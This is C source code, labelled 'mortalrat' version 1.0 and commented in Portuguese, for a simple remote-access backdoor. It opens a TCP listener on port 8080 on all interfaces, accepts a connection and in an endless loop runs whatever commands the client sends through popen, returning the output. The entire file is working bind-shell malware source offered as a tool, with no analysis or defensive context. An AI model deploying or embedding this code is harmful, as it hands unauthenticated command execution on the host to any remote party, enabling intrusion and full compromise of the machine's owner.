#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 8080

void execmd(int client_sock) {
    char buffer[1024];
    int n;

    // Receber comando do cliente
    n = read(client_sock, buffer, sizeof(buffer) - 1);
    if (n <= 0) {
        perror("read");
        close(client_sock);
        exit(EXIT_FAILURE);
    }
    buffer[n] = '\0';

    // Executar comando recebido
    FILE *fp = popen(buffer, "r");
    if (fp == NULL) {
        perror("popen");
        close(client_sock);
        exit(EXIT_FAILURE);
    }

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        write(client_sock, buffer, strlen(buffer));
    }
    pclose(fp);

    // Enviar EOF para sinalizar o fim da resposta
    write(client_sock, "EOF", 3);
}

int main() {
    int server_s, client_sock;
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    printf("\n  version: 1.0\n  mortalrat.\n\n");
    // Criar o socket
    server_s = socket(AF_INET, SOCK_STREAM, 0);
    if (server_s == 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    // Configurar o endereço do servidor
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Vincular o socket ao endereço
    if (bind(server_s, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind failed");
        close(server_s);
        exit(EXIT_FAILURE);
    }

    printf("[>] server waiting for connection...\n");

    // Ouvir conexões
    if (listen(server_s, 3) < 0) {
        perror("listen");
        close(server_s);
        exit(EXIT_FAILURE);
    }

    // Aceitar conexão do cliente
    client_sock = accept(server_s, (struct sockaddr *)&address, (socklen_t*)&addrlen);
    if (client_sock < 0) {
        perror("accept");
        close(server_s);
        exit(EXIT_FAILURE);
    }

    printf("[+] client connected.\n");

    while (1) {
        execmd(client_sock);
    }

    close(client_sock);
    close(server_s);
    return 0;
}
